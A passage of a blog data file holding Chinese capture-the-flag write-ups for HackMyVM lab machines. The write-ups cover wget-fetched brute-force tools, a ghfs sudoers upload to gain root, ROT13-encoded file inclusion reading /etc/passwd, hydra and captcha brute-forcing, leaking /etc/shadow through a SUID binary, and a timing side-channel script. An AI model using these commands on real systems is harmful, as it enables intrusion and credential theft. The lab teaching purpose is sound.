\u6210\u529f\u901a\u8fc7 SSH \u767b\u5f55\u5230\u76ee\u6807\u7cfb\u7edf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh todd@192.168.205.248 -p 2222\ntodd@192.168.205.248's password: todd\n...\ntodd@Chat:~$ id\nuid=1001(todd) gid=1001(todd) groups=1001(todd)\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u6c34\u5e73\u63d0\u5347\uff1atodd -> scycree**\n\n\u767b\u5f55 `todd` \u8d26\u6237\u540e\uff0c\u53d1\u73b0\u5f53\u524d\u6743\u9650\u8f83\u4f4e\u3002\u7684\u76ee\u6807\u662f\u63d0\u5347\u81f3 `root` \u6743\u9650\u3002\u6ce8\u610f\u5230\u7cfb\u7edf\u4e0a\u8fd8\u5b58\u5728\u53e6\u4e00\u4e2a\u7528\u6237 `scycree`\u3002\u5c1d\u8bd5\u7206\u7834 `scycree` \u7528\u6237\u7684\u5bc6\u7801\u3002\n\n\u9996\u5148\uff0c\u5c06\u672c\u5730\u7684\u5bc6\u7801\u7206\u7834\u5de5\u5177 `suForce` \u548c\u5b57\u5178 `rockyou.txt` \u4e0a\u4f20\u5230\u9776\u673a\u7684 `/tmp` \u76ee\u5f55\u3002\n\n```bash\ntodd@Chat:/tmp$ wget 192.168.205.128/suForce\ntodd@Chat:/tmp$ wget 192.168.205.128/rockyou.txt\ntodd@Chat:/tmp$ chmod +x suForce\n```\n\n\u7136\u540e\u6267\u884c\u7206\u7834\uff1a\n\n```bash\ntodd@Chat:/tmp$ ./suForce -u scycree -w rockyou.txt\n...\n\ud83d\udca5 Password | welcome\n...\n```\n\n\u6210\u529f\u7206\u7834\u51fa `scycree` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `welcome`\u3002\u4f7f\u7528 `su` \u547d\u4ee4\u5207\u6362\u5230 `scycree` \u7528\u6237\u3002\n\n```bash\ntodd@Chat:/tmp$ su scycree\nPassword: welcome\nscycree@Chat:/tmp$ id\nuid=1000(scycree) gid=1000(scycree) groups=1000(scycree)\n```\n\n## **2. \u5782\u76f4\u63d0\u5347\uff1ascycree -> root**\n\n\u5207\u6362\u5230 `scycree` \u7528\u6237\u540e\uff0c\u6267\u884c `sudo -l` \u67e5\u770b\u5176 `sudo` \u6743\u9650\u3002\n\n```bash\nscycree@Chat:/tmp$ sudo -l\nMatching Defaults entries for scycree on Chat:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser scycree may run the following commands on Chat:\n    (ALL) NOPASSWD: /usr/bin/ghfs\n```\n\n\u53d1\u73b0 `scycree` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `/usr/bin/ghfs` (Go HTTP File Server)\u3002`ghfs` \u5e26\u6709\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u8fd9\u6784\u6210\u4e86\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6743\u9650\uff0c\u5411 `/etc/sudoers.d/` \u76ee\u5f55\u4e0a\u4f20\u4e00\u4e2a\u6076\u610f\u7684 `sudo` \u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u800c\u6388\u4e88\u81ea\u5df1\u5b8c\u5168\u7684 `root` \u6743\u9650\u3002\n\n\u9996\u5148\uff0c\u4ee5 `root` \u6743\u9650\u542f\u52a8 `ghfs`\uff0c\u5e76\u5c06\u5176\u6839\u76ee\u5f55\u548c\u4e0a\u4f20\u76ee\u5f55\u90fd\u8bbe\u7f6e\u4e3a `/etc/sudoers.d/`\u3002\n\n```bash\nscycree@Chat:/tmp$ sudo /usr/bin/ghfs -r /etc/sudoers.d/ --upload-dir /etc/sudoers.d/\n```\n\n\u63a5\u7740\uff0c\u5728\u672c\u5730\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\u8d4b\u4e88 `scycree` \u7528\u6237\u6240\u6709\u547d\u4ee4\u7684\u65e0\u5bc6\u7801 `sudo` \u6743\u9650\u3002\n\n```bash\n# \u5728\u653b\u51fb\u673a\u4e0a\u6267\u884c\necho 'scycree ALL=(ALL:ALL) NOPASSWD: ALL' > a\n```\n\n\u7136\u540e\uff0c\u901a\u8fc7\u6d4f\u89c8\u5668\u6216 `curl` \u8bbf\u95ee `ghfs` \u63d0\u4f9b\u7684 Web \u670d\u52a1 (`http://192.168.205.248:8080`)\uff0c\u5c06 `a` \u6587\u4ef6\u4e0a\u4f20\u3002\n\n\u4e0a\u4f20\u6210\u529f\u540e\uff0c`scycree` \u7684 `sudo` \u6743\u9650\u88ab\u66f4\u65b0\u3002\u6b64\u65f6\uff0c\u518d\u6b21\u6267\u884c `sudo -l` \u53ef\u4ee5\u770b\u5230\u65b0\u589e\u7684\u6743\u9650\u3002\n\n```bash\nscycree@Chat:/tmp$ sudo -l\n...\nUser scycree may run the following commands on Chat:\n    (ALL) NOPASSWD: /usr/bin/ghfs\n    (ALL : ALL) NOPASSWD: ALL\n```\n\n\u6700\u540e\uff0c\u6267\u884c `sudo bash` \u5373\u53ef\u83b7\u5f97\u4e00\u4e2a `root` shell\u3002\n\n```bash\nscycree@Chat:/tmp$ sudo bash\nroot@Chat:/tmp# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n# **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u4f4d\u4e8e `/root` \u76ee\u5f55\u4e0b\u7684\u6700\u7ec8 `flag`\u3002\n\n```bash\nroot@Chat:/tmp# cat /root/root.txt\nflag{root-c448ebd8ddef14820eef632ffe833f3c}\n```\n\n\u81f3\u6b64\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754441396, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P183": {"htmlDir": "docs/post/hmv_Thirteen.html", "labels": ["HackMyVM", "\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "hmv_Thirteen", "postUrl": "post/hmv_Thirteen.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/183", "commentNum": 0, "wordCount": 4449, "description": "> Tip\n>\n> \u9776\u673a\u5730\u5740\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Thirteen\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.250`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.250 08:00:27:c5:ec:3b       PCS Systemtechnik GmbH\n...\n```\n\n## **2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 21 (FTP)\u300122 (SSH) \u548c 80 (HTTP) \u4e09\u4e2a\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.250\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 07:00 EDT\nNmap scan report for 192.168.205.250\nHost is up (0.00012s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n```\n\n## **3. Web \u670d\u52a1\u63a2\u7d22**\n\n\u8bbf\u95ee 80 \u7aef\u53e3\uff0c\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a 'iCloud Secure Vault'\uff0c\u63d0\u793a\u8f93\u5165\u52a0\u5bc6\u8def\u5f84\u6765\u8bbf\u95ee\u6587\u4ef6\u3002\u9875\u9762\u4e0a\u6709\u4e09\u4e2a\u94fe\u63a5\uff0c\u5176 `href` \u5c5e\u6027\u6307\u5411\u4e86\u7ecf\u8fc7 ROT13 \u52a0\u5bc6\u7684\u6587\u4ef6\u540d\u3002\n\n*   `?theme=jrypbzr.gkg` -> `?theme=welcome.txt`\n*   `?theme=pbasvt.gkg` -> `?theme=config.txt`\n*   `?theme=ernqzr.gkg` -> `?theme=readme.txt`\n\n\u8fd9\u8868\u660e Web \u5e94\u7528\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\uff0c\u901a\u8fc7 ROT13 \u52a0\u5bc6\u6784\u9020 Payload \u5373\u53ef\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6 `/etc/passwd` \u6587\u4ef6\uff0c\u4ee5\u53d1\u73b0\u7cfb\u7edf\u4e0a\u7684\u6709\u6548\u7528\u6237\u3002\n\n**ROT13 \u52a0\u5bc6 `/etc/passwd` -> `/rgp/cnffjq`**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.250/?theme=/rgp/cnffjq\n...\nwelcome:x:1000:1000:,,,:/home/welcome:/bin/bash\nmax:x:1001:1001::/home/max:/bin/bash\n...\n```\n\n\u4ece\u8fd4\u56de\u5185\u5bb9\u4e2d\uff0c\u6211\u4eec\u8bc6\u522b\u51fa\u4e24\u4e2a\u53ef\u767b\u5f55\u7684\u7528\u6237\uff1a`welcome` \u548c `max`\u3002\n\n## **4. FTP \u670d\u52a1\u63a2\u7d22**\n\n\u4f7f\u7528 `hydra` \u548c\u9ed8\u8ba4\u51ed\u636e\u5b57\u5178\u5bf9 FTP \u670d\u52a1\u8fdb\u884c\u7206\u7834\uff0c\u6210\u529f\u83b7\u5f97 `ADMIN` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `12345`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.205.250 -I -u -f -e nsr -t 64\n...\n[21][ftp] host: 192.168.205.250   login: ADMIN   password: 12345\n...\n```\n\n\u767b\u5f55 FTP \u670d\u52a1\u5668\u540e\uff0c\u53d1\u73b0 `ftp_server.py` \u548c `rev.sh` \u4e24\u4e2a\u6587\u4ef6\uff0c\u4f46\u8fd9\u4e9b\u6587\u4ef6\u5728\u6b64\u6b21\u6e17\u900f\u4e2d\u672a\u63d0\u4f9b\u5173\u952e\u5229\u7528\u70b9\u3002\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## **1. \u6f0f\u6d1e\u5229\u7528\uff1aSSH \u5f31\u53e3\u4ee4\u7206\u7834**\n\n\u901a\u8fc7\u524d\u9762 LFI \u6f0f\u6d1e\u8bbf\u95ee\u5230\u7684 `welcome.txt` \u6587\u4ef6\uff0c\u91cc\u9762\u5305\u542b\u4e00\u4e2a\u540d\u5b57\u5217\u8868\u3002\u6211\u4eec\u5c06\u8fd9\u4e2a\u5217\u8868\u4e0e\u4e4b\u524d\u53d1\u73b0\u7684\u7528\u6237\u540d (`max`, `welcome`) \u7ed3\u5408\uff0c\u4f7f\u7528 `cupp` \u5de5\u5177\u751f\u6210\u4e00\u4e2a\u9488\u5bf9\u6027\u7684\u5bc6\u7801\u5b57\u5178 `user.cupp.txt`\u3002\n\n\u968f\u540e\uff0c\u4f7f\u7528 `hydra` \u5bf9 22 \u7aef\u53e3\u7684 SSH \u670d\u52a1\u8fdb\u884c\u5f31\u53e3\u4ee4\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat user\nmax\nwelcome\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ hydra -L user -P user.cupp.txt ssh://192.168.205.250 -I -u -e nsr -t 64\n...\n[22][ssh] host: 192.168.205.250   login: max       password: Ellyas2018\n[22][ssh] host: 192.168.205.250   login: welcome   password: Zakaria2020\n...\n```\n\n\u7206\u7834\u6210\u529f\uff0c\u83b7\u5f97\u4e24\u7ec4\u51ed\u636e\uff1a`max:Ellyas2018` \u548c `welcome:Zakaria2020`\u3002\n\n## **2. \u83b7\u53d6 Shell**\n\n\u4f7f\u7528 `max` \u7528\u6237\u7684\u51ed\u636e\u901a\u8fc7 SSH \u6210\u529f\u767b\u5f55\u5230\u76ee\u6807\u7cfb\u7edf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh max@192.168.205.250\nmax@192.168.205.250's password: Ellyas2018\n...\nmax@13max:~$ id\nuid=1001(max) gid=1001(max) groups=1001(max)\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u6c34\u5e73\u63d0\u5347\uff1amax -> welcome**\n\n\u767b\u5f55 `max` \u8d26\u6237\u540e\uff0c\u9996\u5148\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650\u548c\u7cfb\u7edf\u4e2d\u7684 SUID \u6587\u4ef6\u3002\n\n```bash\nmax@13max:~$ find / -perm -4000 -type f 2>/dev/null\n...\n/usr/local/bin/supersuid\n...\nmax@13max:~$ ls -la /usr/local/bin/supersuid\n-rwsr-sr-- 1 root welcome 161488 Jul  4 10:37 /usr/local/bin/supersuid\n```\n\n\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `supersuid` \u7684 SUID \u6587\u4ef6\uff0c\u5176\u6240\u6709\u8005\u4e3a `root`\uff0c\u6240\u5c5e\u7ec4\u4e3a `welcome`\u3002`max` \u7528\u6237\u4e0d\u5c5e\u4e8e `welcome` \u7ec4\uff0c\u56e0\u6b64\u65e0\u6cd5\u6267\u884c\u6b64\u6587\u4ef6\u3002\n\n\u5229\u7528\u4e4b\u524d\u7206\u7834\u51fa\u7684 `welcome` \u7528\u6237\u5bc6\u7801 `Zakaria2020`\uff0c\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n```bash\nmax@13max:~$ su welcome\nPassword: Zakaria2020\nwelcome@13max:~$ id\nuid=1000(welcome) gid=1000(welcome),1001(max) groups=1000(welcome)\n```\n\n\u6210\u529f\u5207\u6362\u540e\uff0c\u5728 `welcome` \u7684\u5bb6\u76ee\u5f55\u4e2d\u627e\u5230\u5e76\u8bfb\u53d6 `user.flag`\u3002\n\n```bash\nwelcome@13max:~$ cat /home/welcome/user.flag\nflag{user-a89162ba751904d59ebd8fed2fce8880}\n```\n\n## **2. \u5782\u76f4\u63d0\u5347\uff1awelcome -> root**\n\n\u5207\u6362\u5230 `welcome` \u7528\u6237\u540e\uff0c\u6211\u4eec\u73b0\u5728\u6709\u6743\u9650\u6267\u884c `/usr/local/bin/supersuid`\u3002\u6267\u884c\u547d\u4ee4\u4e4b\u540e\uff0c\u6839\u636e\u7ecf\u9a8c\u4e4b\u8c08\u5224\u65ad`supersuid`\u5176\u5b9e\u662f`ss`\u547d\u4ee4\u7684\u5c01\u88c5\uff0c\u901a\u8fc7\u67e5\u8be2 GTFOBins \uff0c\u53ef\u77e5 `ss` \u547d\u4ee4\u5728 SUID \u4e0a\u4e0b\u6587\u4e2d\u53ef\u4ee5\u88ab\u7528\u6765\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\n\n\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u8bfb\u53d6 `/etc/shadow` \u6587\u4ef6\uff0c\u83b7\u53d6 `root` \u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n\n```bash\nwelcome@13max:~$ /usr/local/bin/supersuid -a -F /etc/shadow\nError: an inet prefix is expected rather than 'root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7:::'.\nCannot parse dst/src address.\n```\n\n\u867d\u7136\u547d\u4ee4\u62a5\u9519\uff0c\u4f46\u9519\u8bef\u4fe1\u606f\u4e2d\u5df2\u7ecf\u6cc4\u9732\u4e86 `root` \u7528\u6237\u7684\u54c8\u5e0c\u503c\u3002\u5c06\u54c8\u5e0c\u4fdd\u5b58\u5230\u672c\u5730\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 `john` \u548c `rockyou.txt` \u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n...\napril7th         (root)\n...\n```\n\n\u6210\u529f\u7834\u89e3\u51fa `root` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `april7th`\u3002\n\n\u6700\u540e\uff0c\u4f7f\u7528 `su` \u547d\u4ee4\u548c\u7834\u89e3\u7684\u5bc6\u7801\u5207\u6362\u5230 `root` \u7528\u6237\u3002\n\n```bash\nwelcome@13max:~$ su -\nPassword: april7th\nroot@13max:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n# **\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u5168\u90e8 `flag`\u3002\n\n```bash\nroot@13max:~# cat /root/root.flag /home/welcome/user.flag \nflag{root-aaa245a6e5a82937c985c50c86282892}\nflag{user-a89162ba751904d59ebd8fed2fce8880}\n```\n\n\u81f3\u6b64\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754441419, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P184": {"htmlDir": "docs/post/nei-bu-_tea.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_tea", "postUrl": "post/nei-bu-_tea.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/184", "commentNum": 0, "wordCount": 6498, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u626b\u63cf\u5b58\u6d3b\u4e3b\u673a\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.244`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.244 08:00:27:9a:e3:28       PCS Systemtechnik GmbH\n...\n```\n\n## **2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf**\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u4e24\u4e2a\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.244\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:03 EDT\nNmap scan report for 192.168.205.244\nHost is up (0.000099s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\n## **3. Web \u670d\u52a1\u63a2\u7d22**\n\n\u8bbf\u95ee 80 \u7aef\u53e3\uff0c\u9875\u9762\u663e\u793a\u4e00\u4e2a\u57df\u540d `tea.dsz`\u3002\n\n![image-20250804210408103](http://7r1UMPHK.github.io/image/20250804210408386.webp)\n\n\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0 `/login.php` \u9875\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://192.168.205.244 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt\n...\n/login.php            (Status: 200)\n/index.html           (Status: 200)\n...\n```\n\n\u8bbf\u95ee `http://192.168.205.244/login.php`\uff0c\u53d1\u73b0\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff0c\u63d0\u4f9b\u591a\u79cd\u767b\u5f55\u65b9\u5f0f\u3002\n\n![image-20250804210613846](http://7r1UMPHK.github.io/image/20250804210614066.webp)\n\n\u5c1d\u8bd5\u4e86\u4e00\u4e0b\u5f31\u5bc6\u7801\uff0c\u53d1\u73b0`admin:admin`\u53ef\u4ee5\u767b\u5f55\n\n![image-20250804211131383](http://7r1UMPHK.github.io/image/20250804211131627.webp)\n\n\u63d0\u4f9b\u4e86\u56db\u4e2a\u7528\u6237\u540d\uff0c\u5176\u4e2d\u524d\u4e09\u4e2a\u90fd\u662f\u5f31\u5bc6\u7801\u7684\u7528\u6237\u540d\uff0c\u5ffd\u7565\u3002lingmj\u662f\u7fa4\u6210\u5458\u7684\u7528\u6237\u540d\uff0c\u76ee\u6807\u5c31\u662f\u4ed6\n\n\u90a3\u7a81\u7834\u70b9\u53ef\u80fd\u5c31\u5728\u9a8c\u8bc1\u7801\u767b\u5f55\u90a3\u4e86\n\n![image-20250804210629005](http://7r1UMPHK.github.io/image/20250804210629245.webp)\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## **1. \u6f0f\u6d1e\u5229\u7528\uff1a\u9a8c\u8bc1\u7801\u7206\u7834**\n\n\u9875\u9762\u63d0\u793a\u53ef\u4ee5\u4f7f\u7528\u90ae\u7bb1\u548c4\u4f4d\u9a8c\u8bc1\u7801\u8fdb\u884c\u767b\u5f55\u3002\n\n*\uff08\u6211\u4eec\u7ed3\u5408\u4e00\u4e0b\u57df\u540d\u548c\u6536\u96c6\u7684\u7528\u6237\u540d\uff0c\u5f97\u5230\u4e86lingmj@tea.dsz\u7684\u90ae\u7bb1\uff09*\n\n\u5229\u7528\u6b64\u673a\u5236\uff0c\u6211\u4eec\u4f7f\u7528 Burp Suite \u7684 Intruder \u6a21\u5757\u5bf94\u4f4d\u6570\u5b57\u9a8c\u8bc1\u7801\u8fdb\u884c\u7206\u7834\u3002\n\n*   **Burp Suite \u8bbe\u7f6e**\uff1a\n    1.  \u62e6\u622a\u9a8c\u8bc1\u7801\u767b\u5f55\u7684 POST \u8bf7\u6c42\u3002\n    2.  \u5c06\u8bf7\u6c42\u53d1\u9001\u5230 Intruder \u6a21\u5757\u3002\n    3.  \u5c06\u9a8c\u8bc1\u7801\u53c2\u6570 `code` \u8bbe\u7f6e\u4e3a\u7206\u7834\u70b9\u3002\n    4.  \u8bbe\u7f6e Payload \u4e3a\u6570\u5b57\u5e8f\u5217\uff0c\u8303\u56f4\u4ece 0000 \u5230 9999\u3002\n\n![image-20250804211358010](http://7r1UMPHK.github.io/image/20250804211358352.webp)\n\n\u6210\u529f\u7206\u7834\u51fa\u9a8c\u8bc1\u7801\u4e3a `8379`\u3002\u4f7f\u7528\u8be5\u9a8c\u8bc1\u7801\u6210\u529f\u767b\u5f55\u3002\n\n### **2. \u83b7\u53d6 Shell**\n\n\u767b\u5f55\u540e\uff0c\u9875\u9762\u663e\u793a\u4e86\u4e09\u4e2a\u7528\u6237\u540d\uff08Black, Red, Flower\uff09\u53ca\u5176\u5bf9\u5e94\u7684 MD5 \u54c8\u5e0c\u5bc6\u7801\u3002\n\n```text\nBlack\n83796a396478e084663c06aa25425864\nRed\nd390587c3997d1f6b4e4fe968327e3a2\nFlower\n3c96be08e8b399d1b990f2f5c4939f8b\n```\n\n\u4f7f\u7528\u5728\u7ebf MD5 \u89e3\u5bc6\u5de5\u5177\uff0c\u6210\u529f\u7834\u89e3\u51fa\u660e\u6587\u5bc6\u7801\uff1a\n\n*   `83796a396478e084663c06aa25425864` -> `1234hak54321`\n*   `d390587c3997d1f6b4e4fe968327e3a2` -> `123bugme`\n*   `3c96be08e8b399d1b990f2f5c4939f8b` -> `Cartman`\n\n\u5c1d\u8bd5\u4f7f\u7528\u8fd9\u4e9b\u51ed\u636e\u901a\u8fc7 SSH \u767b\u5f55\u3002\u7528\u6237 `black` \u548c\u5bc6\u7801 `1234hak54321` \u767b\u5f55\u6210\u529f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh black@192.168.205.244\nblack@192.168.205.244's password:\n...\nblack@Tea:~$ id\nuid=1000(black) gid=1000(black) groups=1000(black)\n```\n\n\u767b\u5f55\u540e\uff0c\u5728 `/home/red/` \u76ee\u5f55\u4e0b\u53d1\u73b0 `user.txt` \u6587\u4ef6\uff0c\u5e76\u6210\u529f\u8bfb\u53d6\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nblack@Tea:~$ cat /home/red/user.txt\nflag{user-9667c39f-4203-11f0-9e29-000c2955ba04}\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **\u5782\u76f4\u63d0\u5347\uff1ablack -> root**\n\n\u5728 `/opt` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `check_root_passwd` \u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\n\n```bash\nblack@Tea:~$ ls -al /opt\n-rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd\n```\n\n\u6267\u884c\u8be5\u7a0b\u5e8f\u5e76\u63d0\u4f9b\u4efb\u610f\u8f93\u5165\uff0c\u5747\u8fd4\u56de 'Password error'\u3002\u901a\u8fc7 `time` \u547d\u4ee4\u6d4b\u8bd5\u53d1\u73b0\uff0c\u8f93\u5165\u7279\u5b9a\u957f\u5ea6\uff0810\u4f4d\uff09\u65f6\uff0c\u7a0b\u5e8f\u7684\u6267\u884c\u65f6\u95f4\u6709\u663e\u8457\u5ef6\u8fdf\uff0c\u8fd9\u8868\u660e\u5b58\u5728\u65f6\u95f4\u4fa7\u4fe1\u9053\u653b\u51fb\u7684\u53ef\u80fd\u6027\u3002\n\n```bash\nblack@Tea:/opt$ for len in {1..12}; do inp=$(printf 'a%.0s' $(seq 1 $len)); printf 'Len:%2d -> ' $len; (time ./check_root_passwd '$inp' > /dev/null 2>&1) 2>&1 | grep -o 'real.*'; done\nLen: 1 -> real    0m0.000s\n...\nLen: 9 -> real    0m0.000s\nLen:10 -> real    0m0.201s\nLen:11 -> real    0m0.000s\nLen:12 -> real    0m0.000s\n```\n\n\u57fa\u4e8e\u6b64\u53d1\u73b0\uff0c\u53ef\u4ee5\u7f16\u5199\u811a\u672c\u9010\u4f4d\u7206\u7834\u5bc6\u7801\u3002\u5176\u539f\u7406\u662f\uff1a\u7a0b\u5e8f\u9010\u5b57\u7b26\u6bd4\u8f83\u8f93\u5165\u4e0e\u771f\u5b9e\u5bc6\u7801\uff0c\u6bcf\u6b63\u786e\u4e00\u4f4d\uff0c\u6bd4\u8f83\u65f6\u95f4\u5c31\u4f1a\u7a0d\u957f\u4e00\u4e9b\u3002\u901a\u8fc7\u6d4b\u91cf\u6bcf\u4e2a\u5b57\u7b26\u7684\u54cd\u5e94\u65f6\u95f4\uff0c\u53ef\u4ee5\u786e\u5b9a\u6b63\u786e\u7684\u5bc6\u7801\u3002\n\n\u4f7f\u7528\u4ee5\u4e0b Shell \u811a\u672c\u8fdb\u884c\u7206\u7834\uff1a\uff08\u8fd9\u811a\u672cai\u5199\u7684\uff0c\u5de8\u6162\uff09\n\n```bash\nP=''\nfor p in {0..9}; do\n    LOG=/tmp/log.$p\n    for c in {a..z}; do\n        inp=$(printf '%-10s' '$P$c' | tr ' ' a | cut -c1-10)\n        t=$( { time /opt/check_root_passwd '$inp' >/dev/null 2>&1; } 2>&1 | grep real | awk -F'm' '{gsub(/s/,'',$2); print $2}' )\n        echo '$c $t' >> $LOG\n    done\n    B=$(sort -k2 -nr $LOG | head -1 | awk '{print $1}')\n    P+='$B'\n    echo 'p$p: $B | total: $P'\ndone\necho '$P'\n```\n\n\u7ecf\u8fc7\u7206\u7834\uff0c\u5f97\u5230 root \u5bc6\u7801\u4e3a `toddzhennb`\u3002\n\n# 